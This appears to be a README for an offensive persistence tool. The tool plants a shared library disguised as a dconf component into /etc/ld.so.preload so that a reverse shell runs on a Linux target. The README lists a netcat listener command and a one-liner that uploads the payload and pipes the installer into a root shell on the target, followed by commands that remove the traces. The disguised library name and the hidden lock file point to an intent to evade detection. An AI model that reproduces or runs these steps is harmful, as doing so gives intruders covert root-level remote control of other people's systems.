# LD_PRELOAD:
Implements rate limited reverse shell via dynamic linker

## Files:
- ld_gen.sh: Ran on host machine to compile the so. with hardcoded LHOST/LPORT
- ld_install.sh: Ran on the target to handle pathing, permissions, and integrity checks
- libdconf-update.so: Compiled payload

## Build + Listen:
- bash ld_gen.sh
- nc -lvnp 4444

## Deploy (One liner)
- Uploads the binary and pipes the installer script directly into a remote root shell
    - scp libdconf-update.so target@<IP>:/tmp/ && ssh -t target@<IP> "sudo bash -s" < ld_install.sh

## Cleanup (From host)
- ssh -t target@<IP> "sudo sed -i '\|/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99|d' /etc/ld.so.preload && sudo rm -f /usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99 /var/tmp/.dconf-lock"